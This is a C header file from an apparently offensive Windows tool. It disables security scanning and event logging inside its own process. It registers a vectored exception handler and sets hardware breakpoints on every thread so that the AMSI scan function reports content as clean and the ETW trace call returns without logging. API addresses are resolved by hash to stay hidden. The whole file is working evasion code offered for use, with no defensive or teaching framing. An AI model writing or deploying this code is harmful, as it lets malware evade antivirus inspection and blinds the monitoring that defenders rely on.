// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
// TODO Punkt 7                                                                                              #
// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
#pragma once
#include <windows.h>
#include <tlhelp32.h>
#include "../auxiliary/helpers.h"

// Global addresses for the exception handler to monitor
PVOID g_AmsiAddr = NULL;
PVOID g_EtwAddr  = NULL;

/**
 * Vectored Exception Handler (VEH)
 * Triggered by the CPU when any Hardware Breakpoint (DR0-DR3) is hit.
 */
LONG CALLBACK HwBpHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    // Check if the exception was caused by a Hardware Breakpoint (Single Step)
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        // CASE 1: AMSI Hit (DR0)
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_AmsiAddr)
        {
            // Set return value (Rax) to AMSI_RESULT_CLEAN (0)
            ExceptionInfo->ContextRecord->Rax = 0;

            // Simulate 'ret' instruction
            ExceptionInfo->ContextRecord->Rip = *(DWORD64*)(ExceptionInfo->ContextRecord->Rsp);
            ExceptionInfo->ContextRecord->Rsp += sizeof(PVOID);

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        // CASE 2: ETW Hit (DR1)
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_EtwAddr)
        {
            // Set return value (Rax) to Success (0) - effectively doing nothing but returning
            ExceptionInfo->ContextRecord->Rax = 0;

            // Simulate 'ret' instruction
            ExceptionInfo->ContextRecord->Rip = *(DWORD64*)(ExceptionInfo->ContextRecord->Rsp);
            ExceptionInfo->ContextRecord->Rsp += sizeof(PVOID);

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/**
 * Sets Hardware Breakpoints on all existing threads for both AMSI and ETW.
 */
void SetHwBpOnAllThreads(PVOID amsiAddr, PVOID etwAddr) 
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);
    DWORD myPid = GetCurrentProcessId();

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == myPid) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) {
                    CONTEXT ctx = { 0 };
                    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

                    if (GetThreadContext(hThread, &ctx)) {
                        // Set AMSI address in DR0 and enable it (bit 0)
                        ctx.Dr0 = (DWORD64)amsiAddr;
                        ctx.Dr7 |= (1 << 0); 

                        // Set ETW address in DR1 and enable it (bit 2)
                        ctx.Dr1 = (DWORD64)etwAddr;
                        ctx.Dr7 |= (1 << 2); 

                        SetThreadContext(hThread, &ctx);
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
}

/**
 * Main setup function to initialize HWBP-based AMSI and ETW evasion.
 */
BOOL SetupHWBP_Evasion()
{
    // 1. Resolve AMSI address
    HMODULE hAmsi = HlpGetModuleHandle(0xB921DCA4, 0x73DA31CB);

    if (hAmsi == NULL) {
    hAmsi = LoadLibraryA("amsi.dll");
    }

    if (hAmsi != NULL) {
        g_AmsiAddr = HlpGetProcAddress(hAmsi, 0x78FCCA99, 0x73DA31CB);
    }   

    // 2. Resolve ETW address (NtTraceEvent is in ntdll.dll)
    HMODULE hNtdll = HlpGetModuleHandle(0xC6161C18, 0x73DA31CB);
    if (hNtdll != NULL) {
        g_EtwAddr = HlpGetProcAddress(hNtdll, 0x4A28C043, 0x73DA31CB);
    }

    if (!g_AmsiAddr || !g_EtwAddr) return FALSE;

    // 3. Register the VEH
    AddVectoredExceptionHandler(1, HwBpHandler);

    // 4. Apply both breakpoints to all threads
    SetHwBpOnAllThreads(g_AmsiAddr, g_EtwAddr);

    return TRUE;
}